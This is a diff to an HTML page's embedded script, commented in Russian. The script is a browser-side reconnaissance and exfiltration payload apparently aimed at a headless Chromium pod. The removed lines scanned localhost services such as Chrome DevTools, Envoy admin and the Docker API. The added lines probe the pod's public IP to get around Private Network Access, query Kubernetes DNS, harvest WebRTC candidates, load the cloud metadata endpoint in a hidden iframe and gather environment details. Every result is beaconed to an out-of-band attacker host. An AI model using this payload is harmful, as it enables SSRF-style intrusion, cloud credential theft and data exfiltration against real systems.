@@ -8,59 +8,108 @@ function fire(path) {
   new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
 }
 
-fire('/alive6?t=0');
+fire('/alive7?t=0');
 
-// Сканирование localhost-портов Chromium-пода
-// Таймаут 5000мс чтобы дать сервисам время ответить
-// Ключевые цели:
-//   9222 - Chrome DevTools Protocol (jackpot!)
-//   15000 - Envoy admin
-//   15090 - Envoy Prometheus metrics
-//   8080, 3000, 5000 - типичные app-порты
+// 1. Узнаём внешний IP пода через ipify, затем сканируем его порты
+// Chrome PNA блокирует только localhost/link-local — публичные IP не блокируются
+fetch('https://api.ipify.org/', {signal: AbortSignal.timeout(3000)})
+  .then(function(r) { return r.text(); })
+  .then(function(ip) {
+    ip = ip.trim();
+    fire('/myip?ip=' + encodeURIComponent(ip));
 
-var localPorts = [
-  ['cdp-9222',    'http://127.0.0.1:9222/json'],          // Chrome DevTools - список вкладок
-  ['cdp-ver',     'http://127.0.0.1:9222/json/version'],  // Chrome DevTools version
-  ['envoy-admin', 'http://127.0.0.1:15000/'],             // Envoy admin
-  ['envoy-stats', 'http://127.0.0.1:15000/stats'],        // Envoy stats
-  ['envoy-cfg',   'http://127.0.0.1:15000/config_dump'],  // Envoy config
-  ['envoy-prom',  'http://127.0.0.1:15090/stats/prometheus'], // Envoy Prometheus
-  ['lo-80',       'http://127.0.0.1:80/'],
-  ['lo-8080',     'http://127.0.0.1:8080/'],
-  ['lo-8888',     'http://127.0.0.1:8888/'],
-  ['lo-3000',     'http://127.0.0.1:3000/'],
-  ['lo-5000',     'http://127.0.0.1:5000/'],
-  ['lo-4000',     'http://127.0.0.1:4000/'],
-  ['lo-9090',     'http://127.0.0.1:9090/api/v1/status/buildinfo'],
-  ['lo-9100',     'http://127.0.0.1:9100/metrics'],       // node_exporter
-  ['lo-6379',     'http://127.0.0.1:6379/'],              // Redis
-  ['lo-5601',     'http://127.0.0.1:5601/'],              // Kibana
-  ['lo-2375',     'http://127.0.0.1:2375/version'],       // Docker API
-  ['lo-9229',     'http://127.0.0.1:9229/json'],          // Node.js inspector
-  ['lo-4040',     'http://127.0.0.1:4040/'],              // Spark
-  ['lo-7000',     'http://127.0.0.1:7000/'],
-  ['lo-9333',     'http://127.0.0.1:9333/json'],          // Chrome debug alt
-  ['lo-50051',    'http://127.0.0.1:50051/'],             // gRPC
+    var extTargets = [
+      [9222,  'http://' + ip + ':9222/json'],
+      [9222,  'http://' + ip + ':9222/json/version'],
+      [15000, 'http://' + ip + ':15000/'],
+      [15000, 'http://' + ip + ':15000/config_dump'],
+      [15090, 'http://' + ip + ':15090/stats/prometheus'],
+      [8080,  'http://' + ip + ':8080/'],
+      [9090,  'http://' + ip + ':9090/api/v1/status/buildinfo'],
+    ];
+
+    extTargets.forEach(function(t) {
+      var port = t[0], url = t[1], t0 = Date.now();
+      fetch(url, {signal: AbortSignal.timeout(3000)})
+        .then(function(r) {
+          return r.text().then(function(body) {
+            fire('/ext-ok-' + port + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
+          });
+        })
+        .catch(function(e) {
+          var ms = Date.now() - t0;
+          if (ms < 2900) fire('/ext-err-' + port + '?ms=' + ms + '&e=' + encodeURIComponent(e.message.slice(0, 60)));
+          else fire('/ext-to-' + port);
+        });
+    });
+  })
+  .catch(function(e) { fire('/myip-err?e=' + encodeURIComponent(e.message.slice(0, 60))); });
+
+// 2. k8s DNS discovery по именам сервисов
+var k8sDns = [
+  ['k8s-def',     'https://kubernetes.default/version'],
+  ['k8s-cluster', 'https://kubernetes.default.svc.cluster.local/version'],
+  ['k8s-http',    'http://kubernetes.default.svc.cluster.local:8080/version'],
 ];
-
-localPorts.forEach(function(t) {
+k8sDns.forEach(function(t) {
   var label = t[0], url = t[1], t0 = Date.now();
-  fetch(url, {signal: AbortSignal.timeout(5000)})
+  fetch(url, {signal: AbortSignal.timeout(3000)})
     .then(function(r) {
       return r.text().then(function(body) {
-        fire('/lo-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
+        fire('/dns-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
       });
     })
     .catch(function(e) {
-      var ms = Date.now() - t0;
-      // Только успехи и быстрые ответы - не шлём 5000мс таймауты (слишком много)
-      if (ms < 4900 || e.message.indexOf('timed') === -1) {
-        fire('/lo-err-' + label + '?ms=' + ms + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
-      } else {
-        fire('/lo-to-' + label + '?ms=' + ms);
-      }
+      fire('/dns-err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
     });
 });
+
+// 3. WebRTC без STUN — хост-кандидаты от локальных интерфейсов
+(function() {
+  try {
+    var pc = new RTCPeerConnection({iceServers: [], iceCandidatePoolSize: 4});
+    pc.createDataChannel('x');
+    pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
+    var n = 0;
+    pc.onicecandidate = function(ev) {
+      if (!ev || !ev.candidate) { fire('/rtc-done?n=' + n); return; }
+      n++;
+      fire('/rtc-cand?c=' + encodeURIComponent((ev.candidate.candidate || '').slice(0, 150)));
+    };
+    setTimeout(function() { fire('/rtc-timeout?n=' + n); }, 4000);
+  } catch(e) { fire('/rtc-err?e=' + encodeURIComponent(e.message.slice(0, 80))); }
+})();
+
+// 4. iframe к IMDS
+(function() {
+  var t0 = Date.now();
+  try {
+    var f = document.createElement('iframe');
+    f.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+    f.onload = function() {
+      var ms = Date.now() - t0;
+      fire('/iframe-load?ms=' + ms);
+      try {
+        var txt = f.contentDocument.body.innerText.slice(0, 300);
+        fire('/iframe-body?ms=' + ms + '&d=' + encodeURIComponent(txt));
+      } catch(e2) { fire('/iframe-cors?ms=' + ms); }
+    };
+    f.onerror = function() { fire('/iframe-err?ms=' + (Date.now()-t0)); };
+    f.src = 'http://169.254.169.254/latest/meta-data/';
+    document.body.appendChild(f);
+    setTimeout(function() { fire('/iframe-pending?ms=' + (Date.now()-t0)); }, 5000);
+  } catch(e) { fire('/iframe-ex?e=' + encodeURIComponent(e.message.slice(0, 60))); }
+})();
+
+// 5. Данные среды
+(function() {
+  var info = {
+    ua: navigator.userAgent.slice(0, 100),
+    hw: navigator.hardwareConcurrency || 0,
+    mem: navigator.deviceMemory || 0,
+  };
+  fire('/env?d=' + encodeURIComponent(JSON.stringify(info).slice(0, 200)));
+})();
 </script>
 </body>
 </html>
